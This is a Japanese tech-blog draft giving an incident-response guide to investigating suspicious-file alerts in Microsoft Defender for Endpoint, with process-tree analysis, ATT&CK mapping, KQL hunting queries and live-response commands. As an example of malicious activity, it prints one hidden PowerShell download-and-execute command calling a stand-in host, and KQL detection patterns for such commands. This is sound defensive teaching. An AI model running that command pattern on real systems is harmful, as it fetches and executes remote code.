---
title: "Microsoft Defender for Endpoint で不審なファイルを見る際には何を見るのか？"
emoji: "🛡" 
type: "tech" ## tech: 技術記事 / idea: アイデア記事
topics: [Microsoft Defender, Security] 
published: false
---

Microsoft Defender for Endpoint (MDE) で不審なファイルに関するアラートが発生した際、調査の方法を個人的にまとめました。自分がインシデント対応をしたり、人に教える際のメモではありますが、誰かの参照になれば幸いです。

## 前提条件

**対象読者**
- MDEの管理者であるが、インシデント対応の経験が限定的な方

**記載すること**
- Microsoft Defender for Endpoint (MDE) P2ライセンスの範囲でできる、不審なファイル調査の実践的手順
- 各調査段階で確認すべき具体的なポイント

**記載しないこと**
- Defedner XDR での不審なファイル以外のシナリオ（不審なPowerShell実行、Identity関連検出など）
- 一般的なデジタルフォレンジックやマルウェア解析の技術論
- MDE以外のツールを使用した調査手法

## 全体像：砂時計型調査アプローチ

セキュリティインシデント調査では、**広い視点から徐々に焦点を絞り込み（ファネル）、脅威を特定した後に再び影響範囲を拡大して調査する** 砂時計型のアプローチが大事だと考えています。本書の構成もこの流れに沿って、以下の4段階で調査を進めます。

1. **初期トリアージ**：アラートの重要度判定と基本情報収集
2. **ファイル詳細分析**：不審なファイルの特性と動作の解析
3. **攻撃チェーン再構築**：攻撃の全体像把握
4. **影響範囲調査**：組織全体での被害範囲特定

## 初期トリアージ

### アラート重大度の評価

Microsoft Defender ポータルの「インシデントとアラート」キューで最初に確認すべき項目はアラートの重大度です。

**重大度による優先順位付け**
- **高（赤色）**：APT攻撃、ランサムウェア、認証情報窃取など
- **中（オレンジ）**：潜在的な脅威、疑わしい動作
- **低・情報（黄・青）**：異常な動作、ポリシー違反

**実践ポイント**：重大度が「低」でも、組織の重要システムや特権ユーザーに関連する場合は優先度を上げて対応しましょう。

### 検出状態の確認

アラートの「状態」欄で脅威の現在の状況を把握します。

- **防止済み/ブロック済み**：攻撃は阻止されたが、侵入経路や影響範囲の調査が必要
- **検出済み**：攻撃が進行中または成功した可能性が高い（**最優先対応**）
- **許可済み**：管理者が意図的に許可したファイル（通常は調査不要）

### インシデント全体の把握

**重要**：単独のアラートではなく、必ずインシデント全体を確認してください。

**インシデントビューで確認する項目**：
- **攻撃ストーリー**：時系列での攻撃の展開過程
- **インシデントグラフ**：関連する資産（デバイス、ユーザー、ファイル）の関係性
- **関連アラート数**：複数のアラートが関連している場合は組織的攻撃の可能性

**具体例**：
```
単体アラート：「不審なPowerShellコマンド実行」
↓
インシデント全体：「フィッシングメール → マクロ実行 → PowerShell → ファイルダウンロード」
```

この全体像により、単純なスクリプト実行ではなく、フィッシング攻撃の一環であることが判明します。

### 基本情報の記録

調査開始時に以下の情報を記録：

**影響を受けた資産**
- デバイス名、IPアドレス、OS種別
- ユーザーアカウント名、権限レベル（一般ユーザー/管理者）
- 部署・業務上の重要度

**不審なファイル**
- ファイル名、フルパス
- ファイルサイズ、作成日時
- 発見場所（ダウンロード、メール添付、USB等）

## ファイル分析

### ファイルプロファイルページへのアクセス

アラート詳細画面からファイル名またはハッシュ値をクリックして「ファイルプロファイル」ページに移動します。

### 基本メタデータの検証

**ハッシュ値の確認**
- SHA1、SHA256、MD5の各ハッシュ値を記録
- これらの値は後の組織全体調査で使用

**デジタル署名の検証**
- **信頼できる署名**：Microsoft、Adobe、Google等の正規ベンダー
- **無効な署名**：期限切れ、改ざんされた署名
- **署名なし**：個人開発者のツールまたは悪意のあるファイルの可能性

**ファイル名の分析**
正規プロセスに偽装したファイル名の例：
- `svchost1.exe`（正規：`svchost.exe`）
- `microsoftupdate.exe`（正規の更新プロセスとは異なる）
- `system32.exe`（システムフォルダ名を模倣）

### 普及率による脅威判定

**組織内普及率**
- **1-2台**：標的型攻撃や新しいマルウェアの可能性が高い
- **10-50台**：限定的な感染または特定部署への攻撃
- **数百台以上**：一般的なソフトウェアである可能性（ただし、ワームの場合もあり）

**グローバル普及率**
Microsoftのクラウド分析による全世界での発見状況：
- **非常に稀**：新種のマルウェアまたは標的型攻撃
- **稀**：最近発見されたマルウェアまたは特定地域での攻撃
- **一般的**：正規ソフトウェアまたは既知のマルウェア

**時系列分析**
- **初回確認日時**：組織で初めて発見された日時（新しい攻撃キャンペーンの開始を示唆）
- **最終確認日時**：最近の活動状況（現在進行中の脅威かどうか）

### 外部脅威インテリジェンス

**VirusTotal連携結果**
検出率の解釈例：
- **45/70（64%）**：既知のマルウェア、即座に対処が必要
- **5/70（7%）**：疑わしいが、偽陽性の可能性もあり追加調査が必要
- **0/70（0%）**：新種の脅威または正規ファイル、詳細分析が必要

**脅威インテリジェンス情報**
- 既知のマルウェアファミリー名
- 攻撃グループとの関連性
- 攻撃対象となる業界・地域

### 動的解析（サンドボックス実行）

Microsoftの安全な環境で未知ファイルを実行し、以下の動作を分析：

**ネットワーク活動**
- 外部サーバーへの通信先（C&Cサーバーの可能性）
- 通信内容（データ窃取、コマンド受信など）
- 使用プロトコル（HTTP、HTTPS、DNS、カスタムプロトコル）

**システム変更**
- 作成・変更されたファイル（追加のマルウェア、設定ファイル）
- レジストリの変更（永続化、設定変更）
- サービス・タスクの作成（自動実行の仕組み）

**プロセス活動**
- 起動された子プロセス
- メモリ内での動作
- 他のプロセスへの影響

## 3. 攻撃チェーン再構築：攻撃の全体像把握

### 3.1 プロセスツリー分析

**親子プロセスの関係性把握**

典型的な攻撃フローの例：
```
outlook.exe（メール受信）
└── winword.exe（Word文書を開く）
    └── powershell.exe（マクロからPowerShell実行）
        └── suspicious_file.exe（不審なファイル実行）
            └── cmd.exe（システムコマンド実行）
```

**異常なプロセス関係の検出**
- `explorer.exe` から直接 `powershell.exe` が起動（通常のユーザー操作では稀）
- `winword.exe` から `cmd.exe` が起動（文書アプリからコマンド実行は異常）
- システムプロセスから未知の実行ファイルが起動

**コマンドライン引数の分析**
各プロセスの起動パラメータから攻撃手法を特定：

悪意のあるコマンドライン例：
```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')"
```

### 3.2 デバイスタイムライン調査

**時系列イベントの完全な把握**
最大6ヶ月間のデバイス上のすべてのアクティビティを時系列で確認

**効果的なフィルタリング戦略**
1. **実行前イベント**（-2時間）：ファイルの到着経路を特定
   - メール受信、ウェブダウンロード、USB接続
2. **実行時イベント**（±30分）：直接的な影響を把握
   - プロセス実行、ファイル作成、ネットワーク通信
3. **実行後イベント**（+24時間）：二次的な影響を調査
   - 追加ファイルのダウンロード、横展開の試行

**重要なイベントタイプ**
- **ファイルイベント**：作成、変更、削除、実行
- **ネットワークイベント**：外部通信、内部横展開
- **レジストリイベント**：設定変更、永続化
- **認証イベント**：ログイン試行、権限昇格

### 3.3 MITRE ATT&CK フレームワークマッピング

検出されたイベントを標準的な攻撃手法に分類：

**主要な戦術（Tactics）と技術（Techniques）**

**初期アクセス（TA0001）**
- T1566.001: スピアフィッシング（添付ファイル）
- T1566.002: スピアフィッシング（リンク）
- T1091: リムーバブルメディア

**実行（TA0002）**
- T1059.001: PowerShell
- T1059.003: Windows Command Shell
- T1204.002: 悪意のあるファイル

**永続化（TA0003）**
- T1547.001: レジストリ Run キー
- T1053.005: スケジュールタスク
- T1547.009: ショートカット変更

**防御回避（TA0005）**
- T1055: プロセスインジェクション
- T1027: 難読化されたファイル
- T1070.001: インジケーター除去

このマッピングにより、攻撃者の意図と次に想定される行動を予測できます。

## 4. 影響範囲調査：組織全体での脅威拡散状況

### 4.1 高度な追跡（Advanced Hunting）の活用

Kusto Query Language (KQL) を使用して最大30日間のデータから類似の脅威を検索します。

### 4.2 IOC（侵害指標）による全組織調査

**特定したIOCの種類**
- ファイルハッシュ（SHA1、SHA256、MD5）
- ファイル名・パス
- 悪意のあるIP アドレス・ドメイン
- レジストリキー・値
- コマンドライン引数

### 4.3 実践的なKQLクエリ集

**特定ファイルハッシュの全組織検索**
```kql
// SHA256ハッシュによる包括的検索
let targetHash = "悪意のあるファイルのSHA256ハッシュ";
union 
    (DeviceFileEvents | where SHA256 == targetHash),
    (DeviceProcessEvents | where SHA256 == targetHash or InitiatingProcessSHA256 == targetHash),
    (DeviceImageLoadEvents | where SHA256 == targetHash or InitiatingProcessSHA256 == targetHash)
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp desc
```

**類似ファイル名パターンの検索**
```kql
// 正規プロセス名に類似した悪意のあるファイルを検索
DeviceProcessEvents
| where FileName matches regex @"svchost\d+\.exe|explorer\d+\.exe|winlogon\d+\.exe"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp desc
```

**悪意のあるネットワーク通信の検索**
```kql
// 特定のC&Cサーバーへの通信を検索
let maliciousIPs = dynamic(["192.168.1.100", "10.0.0.50"]);
let maliciousDomains = dynamic(["malicious-site.com", "evil-domain.net"]);
DeviceNetworkEvents
| where RemoteIP in (maliciousIPs) or RemoteUrl has_any (maliciousDomains)
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl, RemotePort
| sort by Timestamp desc
```

**PowerShellによる悪意のある活動の検索**
```kql
// 不審なPowerShellコマンドの検索
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any ("DownloadString", "IEX", "Invoke-Expression", "bypass", "hidden")
| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp desc
```

**時間範囲を指定した関連イベント検索**
```kql
// 特定期間内の関連イベントを包括的に検索
let startTime = datetime(2024-01-01 09:00:00);
let endTime = datetime(2024-01-01 18:00:00);
let targetDevice = "DESKTOP-ABC123";
union 
    (DeviceProcessEvents | where Timestamp between (startTime .. endTime) and DeviceName == targetDevice),
    (DeviceFileEvents | where Timestamp between (startTime .. endTime) and DeviceName == targetDevice),
    (DeviceNetworkEvents | where Timestamp between (startTime .. endTime) and DeviceName == targetDevice)
| sort by Timestamp asc
```

### 4.4 調査結果の評価と判定

**感染範囲の分類**
- **単独感染**：1台のデバイスのみ → 標的型攻撃または初期段階
- **部分感染**：特定部署・チーム → 横展開が開始された可能性
- **広域感染**：組織全体 → ワーム型マルウェアまたは大規模侵害

**緊急度の再評価**
調査結果に基づいて初期の緊急度評価を見直し：
- 重要システムへの影響
- 機密情報へのアクセス可能性
- 攻撃の継続性

## 5. 対応と修復：脅威の封じ込めと根絶

### 5.1 即座の封じ込め対応

**影響を受けたデバイスの分離**
- ネットワーク接続を遮断（横展開防止）
- MDE管理サービスとの通信は維持（遠隔操作を可能にする）
- 業務への影響を最小限に抑えた分離手順

**悪意のあるプロセスの停止**
- 実行中の不審なプロセスを即座に終了
- 関連するサービス・タスクの無効化
- プロセス再起動の防止

**ファイルの検疫と削除**
- 悪意のあるファイルの安全な隔離
- システム復旧に必要なファイルの誤削除防止
- 検疫前のフォレンジック証跡保全

### 5.2 根本的な脅威除去

**包括的なマルウェアスキャン**
- フルシステムスキャンの実行
- カスタム定義ファイルによる検索
- ルートキット検出スキャン

**システム整合性の確認**
- 重要なシステムファイルの検証
- レジストリの整合性チェック
- 不正な永続化メカニズムの除去

**調査パッケージの収集**
詳細なフォレンジック調査のためのデータ収集：
- メモリダンプ
- システムログ
- ネットワーク通信記録
- ファイルシステムの詳細情報

### 5.3 ライブ応答による高度な調査

リモートコマンドラインアクセスによる手動調査：

**ファイルシステム調査**
```cmd
# 隠しファイル・フォルダの検索
dir /a:h /s C:\

# 最近変更されたファイルの確認
forfiles /m *.* /s /c "cmd /c echo @path @fdate @ftime" | findstr "2024"
```

**プロセスとサービスの詳細調査**
```cmd
# 実行中プロセスの詳細情報
wmic process list full

# 不審なサービスの特定
sc query type=service state=all
```

**ネットワーク接続の確認**
```cmd
# アクティブな接続の確認
netstat -ano

# DNS キャッシュの確認
ipconfig /displaydns
```

### 5.4 予防的セキュリティ強化

**IOCベースのブロック設定**
- 悪意のあるファイルハッシュのブロック
- C&Cサーバーの IP アドレス・ドメインのブロック
- 攻撃に使用されたコマンドパターンの検出ルール追加

**セキュリティポリシーの見直し**
- PowerShell実行ポリシーの強化
- マクロ実行制限の設定
- USB デバイス使用制限

**ユーザー教育とトレーニング**
- フィッシング攻撃の識別訓練
- 不審なファイルの取り扱い指導
- インシデント報告手順の周知

## まとめ

Microsoft Defender for Endpoint を使用した不審なファイル調査では、以下の点が重要です：

**体系的なアプローチ**
砂時計型の調査フローに従い、広い視点から狭い分析、そして再び広範囲な影響調査を行うことで、脅威の全体像を正確に把握できます。

**証拠保全と文書化**
各段階で発見した情報を適切に記録し、攻撃の再現可能な証跡を残すことが、将来の類似攻撃への対策につながります。

**迅速かつ適切な対応**
調査結果に基づいた段階的な対応により、被害を最小限に抑えながら組織のセキュリティを強化できます。

**継続的な改善**
各インシデントから得られた教訓を組織のセキュリティ体制強化に活かし、より堅牢な防御機能を構築していくことが重要です。

このガイドを参考に、実際のインシデント対応において効果的な調査と対応を実施してください。経験を積むことで、より迅速で正確な脅威判定が可能になります。

